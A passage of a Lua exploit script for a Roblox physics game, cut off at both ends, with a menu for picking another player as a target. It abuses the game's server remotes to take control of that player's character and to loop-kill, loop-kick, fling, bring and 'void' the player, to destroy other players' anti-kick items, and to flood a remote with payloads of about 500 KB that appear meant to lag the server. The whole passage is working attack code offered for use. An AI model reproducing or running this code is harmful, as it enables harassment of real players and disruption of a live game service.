        char:SetAttribute("OriginalPosition", hrp:GetPivot())
    end
end

function getOriginalPosAttr()
    local char = LocalPlayer.Character
    return char and char:GetAttribute("OriginalPosition") or nil
end

function initCharAttrs()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char:SetAttribute("OriginalPosition", char.HumanoidRootPart:GetPivot())
        char:SetAttribute("SavingOriginalPos", false)
    end
end

function scheduleReturnHome()
    local originalPos = getOriginalPosAttr()
    if not originalPos then
        return
    end
    
    local conn
    conn = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp:PivotTo(originalPos)
            if getgenv().originalFallenHeight then
                Workspace.FallenPartsDestroyHeight = getgenv().originalFallenHeight
            end
            char:SetAttribute("SavingOriginalPos", false)
        end
        cameraAnchor:detach()
        conn:Disconnect()
    end)
end

function modifyTarget(root, hum)
    if not (root and hum) or hum.Health <= 0 then
        return
    end
    local blob = ensureBlobman()
    if blob and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
        local drop = blob.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")
        if drop then
            for _, part in ipairs(hum.Parent:GetDescendants()) do
                if part:IsA("Weld") or part:IsA("BallSocketConstraint") then
                    drop:FireServer(part, part)
                end
            end
        end
    end
    hum.Sit = false
    hum:ChangeState(Enum.HumanoidStateType.Running)
    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    hum:ChangeState(Enum.HumanoidStateType.GettingUp)

    local plr = Players:GetPlayerFromCharacter(hum.Parent)
    if plr and plr:FindFirstChild("IsHeld") then
        plr.IsHeld.Value = false
    end
    local rag = hum:FindFirstChild("Ragdolled")
    if rag then
        rag.Value = false
    end

    local bv, bav = Instance.new("BodyVelocity"), Instance.new("BodyAngularVelocity")
    bv.MaxForce = Vector3.new(1e7, - 1e7, 1e7)
    bv.P = 100
    bv.Velocity = Vector3.new(math.random(- 500, 50), - 50, math.random(- 50, 50))
    bav.MaxTorque = Vector3.new(- 1e7, - 1e7, - 1e7)
    bav.P = 1e6
    bav.AngularVelocity = Vector3.new(math.random(- 500, 300), math.random(- 300, 300), math.random(- 500, 500))
    bv.Parent, bav.Parent = root, root

    hum.BreakJointsOnDeath = false
    hum:ChangeState(Enum.HumanoidStateType.Dead)
    hum.RigType = Enum.HumanoidRigType.R15

    task.delay(0.08, function()
        if bv.Parent then
            bv:Destroy()
        end
        if bav.Parent then
            bav:Destroy()
        end
    end)
end

function performKill()
    if not SelectedPlayer then
        return
    end
    
    local target = Players:FindFirstChild(SelectedPlayer)
    local tChar = target and target.Character
    local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
    local tHum = tChar and tChar:FindFirstChild("Humanoid")
    local tHead = tChar and tChar:FindFirstChild("Head")
    
    if not (target and tRoot and tHum and tHead) then
        return
    end
    if isTooHigh(target) then
        return
    end
    if target:FindFirstChild("InPlot") and target.InPlot.Value then
        return
    end
    if tHum:GetState() == Enum.HumanoidStateType.Dead then
        return
    end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not (char and hrp) then
        return
    end

    if not char:GetAttribute("SavingOriginalPos") then
        saveOriginalPosAttr()
    end
    char:SetAttribute("SavingOriginalPos", true)

    getgenv().originalFallenHeight = Workspace.FallenPartsDestroyHeight
    Workspace.FallenPartsDestroyHeight = 0 / 0

    local originalPos = getOriginalPosAttr()
    if originalPos then
        cameraAnchor:attach(originalPos)
    end

    local desiredCFrame = CFrame.new(tRoot.Position + TELEPORT_OFFSET)
    hrp:PivotTo(desiredCFrame)

    setNoCollideChar(tChar)
    RemoteSetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
    task.wait()
    RemoteDestroyGrabLine:FireServer(tRoot)
    task.wait()

    if tHead:FindFirstChild("PartOwner") and tHead.PartOwner.Value == LocalPlayer.Name then
        task.wait()
        modifyTarget(tRoot, tHum)
    end

    scheduleReturnHome()
end

function StartLoopKill()
    if KillHB then
        KillHB:Disconnect()
    end
    KillHB = RunService.Heartbeat:Connect(performKill)
end

function StopLoopKill()
    if KillHB then
        KillHB:Disconnect()
        KillHB = nil
    end
    cameraAnchor:detach()
end

function sendToSky(root, hum)
    DisableCollisions(hum.Parent)
    local BV = Instance.new("BodyVelocity")
    BV.Velocity = Vector3.new(0, 9000000, 0)
    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    BV.P = 100
    BV.Parent = root
    hum.Sit = false
    hum.Jump = true
    task.delay(0, function()
        if BV.Parent then
            BV:Destroy()
        end
    end)
end

function executeKick()
    if not SelectedPlayer then
        return
    end
    local p = Players:FindFirstChild(SelectedPlayer)
    local c = p and p.Character
    local root = c and c:FindFirstChild("HumanoidRootPart")
    local head = c and c:FindFirstChild("Head")
    local hum = c and c:FindFirstChild("Humanoid")
    if not (root and head and hum) or hum.Health <= 0 then
        return
    end
    if isTooHigh(p) then
        return
    end
    if p:FindFirstChild("InPlot") and p.InPlot.Value then
        return
    end

    local selfChar = LocalPlayer.Character
    local selfRoot = selfChar and selfChar:FindFirstChild("HumanoidRootPart")
    if not selfRoot then
        return
    end

    local saved = selfChar:GetPivot()
    selfChar:PivotTo(CFrame.new(root.Position + Vector3.new(0, 0, - 3)))
    DisableCollisions(c)
    RemoteSetNetworkOwner:FireServer(root, root.CFrame)
    task.wait()
    selfChar:PivotTo(saved)
    task.wait(0.005)
    RemoteDestroyGrabLine:FireServer(root)
    task.wait(0.005)
    local po = head:FindFirstChild("PartOwner")
    if po and po.Value == LocalPlayer.Name then
        sendToSky(root, hum)
    end
end

function StartLoopKick()
    if KickHB then
        KickHB:Disconnect()
    end
    LoopKickOn = true
    KickHB = RunService.Heartbeat:Connect(function()
        if LoopKickOn then
            executeKick()
        end
    end)
end

function StopLoopKick()
    LoopKickOn = false
    if KickHB then
        KickHB:Disconnect()
        KickHB = nil
    end
end


function getPlayerList()
    local list = {}
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local displayName = plr.DisplayName or plr.Name
            local entry = string.format("%s (@%s)", displayName, plr.Name)
            table.insert(list, entry)
        end
    end
    return list
end

function extractUsername(entry)
    local username = entry:match("@([%w_]+)")
    return username
end



local Players = game:GetService("Players")

local SelectedPlayer = nil
local PlayerDropdown -- reference so input can update it


local function GetPlayerNames()
    local names = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        table.insert(names, plr.Name)
    end
    return names
end


local function RefreshDropdown()
    if PlayerDropdown then
        PlayerDropdown:Refresh(GetPlayerNames(), true)
    end
end


local Input = LoopTab:CreateInput({
    Name = "Target Player",
    Info = "Enter player name to target",
    PlaceholderText = "Player name...",
    NumbersOnly = false,
    CharacterLimit = 50,
    OnEnter = true,
    RemoveTextAfterFocusLost = false,

    Callback = function(Text)
        if Text == "" then
            SelectedPlayer = nil
            print("Target cleared")
            return
        end

        local foundPlayer = nil
        local search = Text:lower()

        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name:lower():find(search)
            or (player.DisplayName and player.DisplayName:lower():find(search)) then
                foundPlayer = player
                break
            end
        end

        if foundPlayer then
            SelectedPlayer = foundPlayer.Name
            print("Target set to: " .. foundPlayer.Name)

            if PlayerDropdown then
                PlayerDropdown:Set(foundPlayer.Name)
            end
        else
            print("Player not found: " .. Text)
        end
    end,
})


PlayerDropdown = LoopTab:CreateDropdown({
    Name = "Players",
    Options = GetPlayerNames(),
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "PlayerSelect",

    Callback = function(Option)
        local username
        
        if type(Option) == "table" then
            username = Option[1]
        else
            username = Option
        end

        if not username or username == "" then
            SelectedPlayer = nil
            print("Target cleared")
            return
        end

        local plr = Players:FindFirstChild(username)

        if plr then
            SelectedPlayer = plr.Name
            print("Target set to: " .. plr.Name)
        else
            print("Player not found in game: " .. username)
            SelectedPlayer = nil
        end
    end,
})

Players.PlayerAdded:Connect(function()
    if PlayerDropdown then
        PlayerDropdown:Refresh(GetPlayerNames())
    end
end)

Players.PlayerRemoving:Connect(function(player)
    if PlayerDropdown then
        PlayerDropdown:Refresh(GetPlayerNames())
    end
    
    if SelectedPlayer == player.Name then
        SelectedPlayer = nil
        print("Target left the game")
    end
end)


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local plr = Players.LocalPlayer
local mouse = plr:GetMouse()

local grabRemote = ReplicatedStorage
    :WaitForChild("GrabEvents")
    :WaitForChild("ExtendGrabLine")

local kilobytes, packets = 500, 1
local interval = 0.25


local Enabled = false


LoopTab:CreateToggle({
    Name = "B to packet send",
    CurrentValue = false,
    Flag = "ClickPacketToggle",
    Callback = function(Value)
        Enabled = Value
    end,
})

local running = false

local function runPkt()
    if not Enabled then return end
    if running then return end
    running = true

    local data = string.rep("❤️‍Oatsy❤️", kilobytes * 1024)

    for i = 1, packets do
        if not Enabled then break end
        grabRemote:FireServer(data)
        task.wait(interval)
    end

    running = false
end


local Enabled = true  

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and Enabled then  
        if input.KeyCode == Enum.KeyCode.B then
            runPkt()
        end
    end
end)


LoopTab:CreateButton({
    Name = 'Bring',
    Callback = function()
        if not SelectedPlayer then
            return
        end

        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local root = character:WaitForChild("HumanoidRootPart")
        local oldCFrame = root.CFrame

        local targetPlayer = Players:FindFirstChild(SelectedPlayer)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
            local targetHead = targetPlayer.Character.Head

            for i = 1, 2 do
                if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("Head") then
                    break
                end
                root.CFrame = targetHead.CFrame * CFrame.new(2, 0, 0)
                local args = {
                    [1] = targetHead,
                    [2] = root.CFrame
                }
                RemoteSetNetworkOwner:FireServer(unpack(args))
                task.wait(0.3)
            end

            task.wait(0.3)
            root.CFrame = oldCFrame
            local front = oldCFrame.LookVector * 5
            targetHead.CFrame = CFrame.new(oldCFrame.Position + front)

            local destroyArgs = {
                [1] = targetHead
            }
            RemoteDestroyGrabLine:FireServer(unpack(destroyArgs))
        end
    end
})

LoopTab:CreateToggle({
    Name = 'Loop Kick (ownership)',
    CurrentValue = false,
    Flag = "LoopKickToggle",
    Callback = function(v)
        if v then
            StartLoopKick()
        else
            StopLoopKick()
        end
    end
})

LoopTab:CreateToggle({
    Name = "Loop Kill",
    CurrentValue = false,
    Flag = "LoopKillToggle",
    Callback = function(v) 
        if v then
            StartLoopKill()
        else
            StopLoopKill()
        end 
    end
})

Paragraph = BlobTab:CreateParagraph({Title = "Information", Content = "Targetting is handled by Loop's tab. Blobman kick(init) requires you to float / fly (vfly) whilst using to kick."})

BlobTab:CreateToggle({
    Name = "Blobman Kick(blizt)",
    CurrentValue = false,
    Flag = "BlobKickToggle",
    Callback = function(enabled)
        LoopBlobKickOn = enabled

        local function findMountedBlob()
            local char = Players.LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            return (hum and hum.SeatPart and hum.SeatPart.Parent.Name == "CreatureBlobman") and hum.SeatPart.Parent or nil
        end

        local function bringRightArm(targetName, blob)
            local tp = Players:FindFirstChild(targetName)
            local hrp = tp and tp.Character and tp.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(Players.LocalPlayer, hrp, blob.RightDetector.RightWeld)
            end
        end

        local function execBlobKick(targetName)
            local char = Players.LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not (hum and hrp) then
                return
            end

            local blob = findMountedBlob() or ensureBlobman()
            task.wait(0.12)

            local seat = blob and blob:FindFirstChild("VehicleSeat")
            if seat then
                seat:Sit(hum)
                task.wait(0.12)
            end

            local tp = Players:FindFirstChild(targetName)
            local tHRP = tp and tp.Character and tp.Character:FindFirstChild("HumanoidRootPart")
            if not tHRP then
                return
            end

            local startSelf, startBlob = hrp.CFrame, blob.PrimaryPart and blob.PrimaryPart.CFrame
            local oldCF = tHRP.CFrame
            hrp.CFrame = oldCF
            task.wait(0.12)

            for _ = 1, 15 do
                task.wait()
                RemoteSetNetworkOwner:FireServer(tHRP, tHRP.CFrame)
                tHRP.CFrame = oldCF * CFrame.new(0, 40, 0)
            end
            task.wait(0.13)
            RemoteDestroyGrabLine:FireServer(tHRP)
            task.wait(0.13)

            bringRightArm(targetName, blob)
            bringRightArm(targetName, blob)
            bringRightArm(targetName, blob)

            task.delay(0.55, function()
                if hrp then
                    hrp.CFrame = startSelf
                end
                if blob and blob.PrimaryPart and startBlob then
                    blob:SetPrimaryPartCFrame(startBlob)
                end
            end)
        end

        local function monitorRespawnBlobKick(targetName)
            local tp = Players:FindFirstChild(targetName)
            if not tp then
                return
            end
            tp.CharacterAdded:Connect(function()
                if LoopBlobKickOn then
                    task.wait(0.75)
                    execBlobKick(targetName)
                end
            end)
        end

        if enabled then
            if SelectedPlayer and SelectedPlayer ~= "" then
                execBlobKick(SelectedPlayer)
                monitorRespawnBlobKick(SelectedPlayer)
            end
        else
            LoopBlobKickOn = false
        end
    end
})

BlobTab:CreateToggle({
    Name = "Blob Kill",
    CurrentValue = false,
    Flag = "BlobKillToggle",
    Callback = function(enabled)
        LoopBlobKillOn = enabled

        local function execBlobKill(targetName)
            if not targetName or targetName == "" then
                return
            end
            local plr = Players:FindFirstChild(targetName)
            if not plr or not plr.Character then
                return
            end
            local localPlayer = Players.LocalPlayer
            local localChar = localPlayer.Character
            if not localChar then
                return
            end
            local hum = localChar:FindFirstChild("Humanoid")
            local hrp = localChar:FindFirstChild("HumanoidRootPart")
            if not (hum and hrp) then
                return
            end
            local blob = (hum.SeatPart and hum.SeatPart.Parent.Name == "CreatureBlobman" and hum.SeatPart.Parent) or ensureBlobman()
            
            if not blob or not blob.PrimaryPart then
                return
            end
            local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
            if not targetHRP then
                return
            end
            if targetHRP.Position.Y > HEIGHT_LIMIT then
                return
            end
            local startLocalCFrame = hrp.CFrame
            local startBlobCFrame = blob.PrimaryPart.CFrame
            blob:SetPrimaryPartCFrame(targetHRP.CFrame)
            if blob:FindFirstChild("VehicleSeat") then
                blob.VehicleSeat:Sit(hum)
                task.wait(0.05)
            end
            local detector = blob:FindFirstChild("LeftDetector")
            local weld = detector and detector:FindFirstChild("LeftWeld")
            if detector and weld then
                blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(detector, targetHRP, weld)
            end
            task.wait(0.05)
            local targetHum = plr.Character:FindFirstChildOfClass("Humanoid")
            if targetHum then
                targetHum.RigType = Enum.HumanoidRigType.R15
            end
            task.wait(0.05)
            if weld then
                blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(weld, targetHRP)
            end
            task.delay(0.05, function()
                hrp.CFrame = startLocalCFrame
                if blob and blob.PrimaryPart then
                    blob:SetPrimaryPartCFrame(startBlobCFrame)
                end
            end)
        end
        if enabled then
            task.spawn(function()
                while LoopBlobKillOn do
                    if SelectedPlayer and Players:FindFirstChild(SelectedPlayer) then
                        local plr = Players[SelectedPlayer]
                        local hum = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
                        if hum and hum.Health > 0 then
                            execBlobKill(SelectedPlayer)
                        end
                    end
                    task.wait(0.06)
                end
            end)
        else
            LoopBlobKillOn = false
        end
    end
})

Players = game:GetService("Players")
Workspace = game:GetService("Workspace")
ReplicatedStorage = game:GetService("ReplicatedStorage")
LocalPlayer = Players.LocalPlayer
antiAntiKickActive = false
recentParts = {}
CONFIG = {
    AURA_RADIUS = 50,
    SCAN_DELAY = 0.1
}
ToyTypes = {
    "NinjaKunai",
    "NinjaShuriken",
    "AntiKick",
    "ToolCleaver",
    "ToolDiggingForkRusty",
    "ToolPencil"
}
DestroyStickyToys = nil

BlobTab:CreateToggle({
    Name = "Delete anti kicks (aura)",
    CurrentValue = false,
    Callback = function(Value)
        antiAntiKickActive = Value
        
        if Value then
            task.spawn(function()
                while antiAntiKickActive do
                    local char = LocalPlayer.Character
                    if char and char.PrimaryPart then
                        local parts = Workspace:GetPartBoundsInRadius(
                            char.PrimaryPart.Position, CONFIG.AURA_RADIUS)

                        for _, part in ipairs(parts) do
                            if part:IsA("BasePart") then
                                local model = part:FindFirstAncestorWhichIsA("Model")
                                if model then
                                    for _, toyName in ipairs(ToyTypes) do
                                        if model.Name == toyName then
                                            local folder = model.Parent
                                            if folder and string.find(folder.Name, "SpawnedInToys") then
                                                if not string.find(folder.Name, LocalPlayer.Name) then
                                                    local stickyPart = model:FindFirstChild("StickyPart")
                                                    if stickyPart then
                                                        pcall(function()
                                                            local SetNetOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
                                                            SetNetOwner:FireServer(stickyPart, stickyPart.CFrame)
                                                            
                                                            if stickyPart:FindFirstChild("PartOwner") and stickyPart.PartOwner.Value == LocalPlayer.Name then
                                                                stickyPart.CFrame = CFrame.new(0, 1000, 0)
                                                            end
                                                        end)
                                                    end
                                                end
                                            end
                                            break
                                        end
                                    end
                                end
                            end
                        end
                    end

                    task.wait(CONFIG.SCAN_DELAY)
                end
            end)
        else
            antiAntiKickActive = false
        end
    end
})

BlobTab:CreateDivider()


Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
LocalPlayer = Players.LocalPlayer

spamActive = false

BlobTab:CreateToggle({
    Name = 'Permnetown kick',
    CurrentValue = false,
    Flag = "SpamKickToggle",
    Callback = function(Value)
        spamActive = Value
        if Value then
            if not SelectedPlayer then
                spamActive = false
                return
            end
            local blob = findBlobman()
            if not blob then
                spamActive = false
                return
            end
            local char = LocalPlayer.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then
                spamActive = false
                return
            end
            local RightDetector = blob:FindFirstChild("RightDetector")
            if not RightDetector then
                spamActive = false
                return
            end
            local RightWeld = RightDetector:FindFirstChild("RightWeld")
            local BlobmanScript = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
            if not (RightWeld and BlobmanScript) then
                spamActive = false
                return
            end
            local CreatureGrab = BlobmanScript:FindFirstChild("CreatureGrab")
            local CreatureRelease = BlobmanScript:FindFirstChild("CreatureRelease")
            if not (CreatureGrab and CreatureRelease) then
                spamActive = false
                return
            end
            task.spawn(function()
                local oldCF = char:GetPivot()
                local targetPlayer = Players:FindFirstChild(SelectedPlayer)
                local targetChar = targetPlayer and targetPlayer.Character
                if not targetChar or not targetChar:FindFirstChild("HumanoidRootPart") then
                    spamActive = false
                    return
                end
                local targetRoot = targetChar.HumanoidRootPart
                pcall(function()
                    char:PivotTo(targetRoot.CFrame)
                    task.wait(0.2)
                    CreatureGrab:FireServer(RightDetector, targetRoot, RightWeld)
                    task.wait(0.1)
                    CreatureRelease:FireServer(RightWeld, targetRoot)
                    task.defer(function()
                        local BodyPos = Instance.new("BodyPosition")
                        BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        BodyPos.Position = oldCF.Position + Vector3.new(math.random(- 15, 15), math.random(- 10, 10), math.random(- 15, 15))
                        BodyPos.Parent = targetRoot
                        BodyPos.P = 45000
                        BodyPos.D = 500
                    end)
                end)
                task.wait(0.4)
                pcall(function()
                    char:PivotTo(oldCF)
                end)
                task.wait(0.5)
                while spamActive do
                    targetPlayer = Players:FindFirstChild(SelectedPlayer)
                    if not targetPlayer or not Players:FindFirstChild(SelectedPlayer) then
                        spamActive = false
                        break
                    end
                    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        task.wait(0.9)
                        continue
                    end
                    targetRoot = targetPlayer.Character.HumanoidRootPart
                    local targetHead = targetPlayer.Character:FindFirstChild("Head")
                    pcall(function()
                        sno(targetRoot)
                        if targetHead then
                            sno(targetHead)
                        end
                        RemoteDestroyGrabLine:FireServer(targetRoot)
                        CreatureGrab:FireServer(RightDetector, targetRoot, RightWeld)
                        if targetHead then
                            GrabEvents.CreateGrabLine:FireServer(targetHead, targetHead.CFrame)
                        end
                        GrabEvents.CreateGrabLine:FireServer(targetRoot, targetRoot.CFrame)
                        CreatureRelease:FireServer(RightWeld, targetRoot)
                    end)
                    task.wait(0.08)
                end
            end)
        end
    end
})


function sno(part)
    if not part or not part.Parent then
        return
    end
    pcall(function()
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
    end)
end

LoopTab:CreateDivider()

function sno(part)
    if not part or not part.Parent then return end
    pcall(function()
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
    end)
end



local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- Variables to store the target
local TargetPlayer = nil
local HRP = nil
local kickLoopEnabled = false

-- Function to get the closest player from cursor
local function GetClosestPlayerFromCursor()
    local targetPart = Mouse.Target
    if not targetPart then return nil end

    local character = targetPart:FindFirstAncestorOfClass("Model")
    if not character then return nil end

    return Players:GetPlayerFromCharacter(character)
end

local kickLoopEnabled = false

LoopTab:CreateToggle({
    Name = "Loop Grab Kick (new one)",
    CurrentValue = false,
    Flag = "LoopGrabKickToggle",
    Callback = function(Value)
        kickLoopEnabled = Value
        
        if kickLoopEnabled then
            if not SelectedPlayer or SelectedPlayer == "" then
                kickLoopEnabled = false
                print("Error: huh??")
                return
            end
            
            task.spawn(function()
                local targetplr = Players:FindFirstChild(SelectedPlayer)
                if not targetplr then 
                    kickLoopEnabled = false
                    print("error: ok what the frik")
                    return 
                end
                
                print("kick that boi " .. targetplr.Name)
                
                while kickLoopEnabled and RunService.Heartbeat:Wait() do
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    local head = char and char:FindFirstChild("Head")
                    
                    if not (char and hrp and head) then 
                        task.wait(0)
                        continue 
                    end

                    targetplr = Players:FindFirstChild(SelectedPlayer)
                    if not targetplr or not targetplr.Character then 
                        task.wait(0)
                        continue 
                    end
                    
                    local Head = targetplr.Character:FindFirstChild("Head")
                    local Hum = targetplr.Character:FindFirstChild("Humanoid")
                    
                    if not (Head and Hum) or Hum.Health == 0 then
                        task.wait(0)
                        continue
                    end
                    
                    local BodyPos = Head:FindFirstChild("BodyPosition")
                    
                    if (Head.Position - hrp.Position).Magnitude <= 30 then
                        if not BodyPos then
                            BodyPos = Instance.new("BodyPosition")
                            BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            BodyPos.Parent = Head
                            BodyPos.P = 45000
                            BodyPos.D = 500
                        end
                        
                        sno(Head)
                        BodyPos.Position = head.Position + Vector3.new(0, 13, 0)
                        
                        pcall(function()
                            ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(Head)
                        end)
                    else
                        local oldCF = char:GetPivot()

                        if not Head or not Hum or Hum.Health == 0 then
                            local newChar = targetplr.CharacterAdded:Wait()
                            Head = newChar:WaitForChild("Head", 2)
                            Hum = newChar:FindFirstChild("Humanoid")
                        end
                        
                        repeat
                            if not kickLoopEnabled then break end
                            
                            pcall(function()
                                char:PivotTo(Head.CFrame * CFrame.new(0, 10, 0))
                            end)
                            
                            sno(Head)
                            task.wait(0)
                            
                        until not Head 
                            or (Head:FindFirstChild("PartOwner") and targetplr:FindFirstChild("IsHeld") and targetplr.IsHeld.Value) 
                            or not kickLoopEnabled
                            
                        if Head and Head:FindFirstChild("PartOwner") then
                            task.defer(function()
                                for i = 1, 59 do
                                    if not kickLoopEnabled or not Head.Parent then break end
                                    pcall(function()
                                        Head.CFrame = oldCF * CFrame.new(0, 15, 0)
                                    end)
                                    task.wait(0)
                                end
                            end)
                        end
                        
                        pcall(function()
                            char:PivotTo(oldCF)
                        end)
                    end
                    
                    task.wait(0)
                end
    
                print("disable")
                
                if targetplr and targetplr.Character then
                    local Head = targetplr.Character:FindFirstChild("Head")
                    if Head then
                       
                        local BodyPos = Head:FindFirstChild("BodyPosition")
                        if BodyPos then
                            BodyPos:Destroy()
                        end
                        pcall(function()
                            ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(Head)
                        end)
                    end
                end
                
                print("aa")
            end)
        else
            kickLoopEnabled = false
            print("disabled")
        end
    end    
})

Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
RunService = game:GetService("RunService")
Workspace = game:GetService("Workspace")

LocalPlayer = Players.LocalPlayer

autoBlobmanEnabled = false
targetCFrame = CFrame.new(466.741, 28, - 745.949, 0.906275, 0, - 0.422688, 0, 1, 0, 0.422688, 0, 0.906275)
originalPosition = nil
processingBlobmans = {}

function saveCurrentPosition()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        originalPosition = LocalPlayer.Character.HumanoidRootPart.CFrame
        return true
    end
    return false
end

function teleportToPosition(cframe)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = cframe
        LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        LocalPlayer.Character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
        return true
    end
    return false
end

function sitOnBlobman(blobman)
    seat = blobman:FindFirstChild("VehicleSeat")
    humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
    
    if seat and humanoid and not seat.Occupant then
        seat:Sit(humanoid)
        task.wait(0.1)
        return seat.Occupant == humanoid
    end
    return false
end

function getOffBlobman()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        humanoid = LocalPlayer.Character.Humanoid
        if humanoid.SeatPart then
            humanoid.Sit = false
            humanoid.Jump = true
            return true
        end
    end
    return false
end

function executeBlobmanSequence(blobman)
    if processingBlobmans[blobman] then
        return
    end
    processingBlobmans[blobman] = true
    
    task.spawn(function()
        if not saveCurrentPosition() then
            processingBlobmans[blobman] = nil
            return
        end
        
        blobmanPosition = nil
        if blobman:FindFirstChild("VehicleSeat") then
            blobmanPosition = blobman.VehicleSeat.CFrame
        elseif blobman:FindFirstChild("HumanoidRootPart") then
            blobmanPosition = blobman.HumanoidRootPart.CFrame
        elseif blobman.PrimaryPart then
            blobmanPosition = blobman:GetPrimaryPartCFrame()
        end
        
        if blobmanPosition then
            teleportToPosition(blobmanPosition + Vector3.new(0, 2, 0))
            task.wait(0.1)
        end
        
        if sitOnBlobman(blobman) then
            task.wait(0.1)
        end
        
        teleportToPosition(targetCFrame)
        task.wait(0.1)
        
        getOffBlobman()
        task.wait(0.1)
        
        if originalPosition then
            teleportToPosition(originalPosition)
        end
        
        processingBlobmans[blobman] = nil
    end)
end

function checkForBlobmans()
    if not autoBlobmanEnabled or not SelectedPlayer then
        return
    end
    
    playerFolder = Workspace:FindFirstChild(SelectedPlayer .. "SpawnedInToys")
    if playerFolder then
        for _, item in ipairs(playerFolder:GetChildren()) do
            if item.Name == "CreatureBlobman" and item:IsA("Model") then
                if not processingBlobmans[item] then
                    executeBlobmanSequence(item)
                end
            end
        end
    end
end

LoopTab:CreateToggle({
    Name = "Void blobman",
    CurrentValue = false,
    Flag = "AutoBlobman",
    Callback = function(Value)
        autoBlobmanEnabled = Value
        if Value then
            if not SelectedPlayer then
                autoBlobmanEnabled = false
                print("adws")
                return
            end
            
            task.spawn(function()
                while autoBlobmanEnabled do
                    checkForBlobmans()
                    task.wait(0.5)
                end
            end)
            
            Workspace.DescendantAdded:Connect(function(descendant)
                if not autoBlobmanEnabled or not SelectedPlayer then
                    return
                end
                
                if descendant.Name == "CreatureBlobman" and descendant:IsA("Model") then
                    parent = descendant.Parent
                    if parent and parent.Name == SelectedPlayer .. "SpawnedInToys" then
                        task.wait(0.1)
                        executeBlobmanSequence(descendant)
                    end
                end
            end)
        else
            processingBlobmans = {}
        end
    end
})

Players = game:GetService("Players")
Workspace = game:GetService("Workspace")
RunService = game:GetService("RunService")

LocalPlayer = Players.LocalPlayer

DestroyTargetGucciActive = false

LoopTab:CreateToggle({
    Name = "Destroy Gucci (sit)",
    CurrentValue = false,
    Callback = function(Value)
        DestroyTargetGucciActive = Value
        
        if Value then
            if not SelectedPlayer then
                print("Select a target first")
                DestroyTargetGucciActive = false
                return
            end
            
            targetPlayer = Players:FindFirstChild(SelectedPlayer)
            if not targetPlayer then
                print("Player not found")
                DestroyTargetGucciActive = false
                return
            end
            
            char = LocalPlayer.Character
            if not char then 
                DestroyTargetGucciActive = false
                return
            end
            
            root = char:FindFirstChild("HumanoidRootPart")
            if not root then 
                DestroyTargetGucciActive = false
                return
            end
            
            SafeSpot = root.CFrame
            
            folderName = targetPlayer.Name .. "SpawnedInToys"
            
            task.spawn(function()
                while DestroyTargetGucciActive and targetPlayer and targetPlayer.Parent do
                    toysFolder = Workspace:FindFirstChild(folderName)
                    
                    if not toysFolder then
                        task.wait(1)
                    else
                        foundBlob = false
                        
                        for _, obj in ipairs(toysFolder:GetChildren()) do
                            if not DestroyTargetGucciActive then break end
                            
                            if obj.Name == "CreatureBlobman" then
                                foundBlob = true
                                seat = obj:FindFirstChild("VehicleSeat")
                                
                                if seat then
                                    myChar = LocalPlayer.Character
                                    myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                                    myHum = myChar and myChar:FindFirstChild("Humanoid")
                                    
                                    if myRoot and myHum then
                                        if myHum.SeatPart ~= seat then
                                            
                                            magnetConnection = RunService.Stepped:Connect(function()
                                                if myRoot and seat then
                                                    myRoot.CFrame = seat.CFrame
                                                    myRoot.Velocity = Vector3.zero
                                                    if obj.PrimaryPart then
                                                        obj.PrimaryPart.Velocity = Vector3.zero
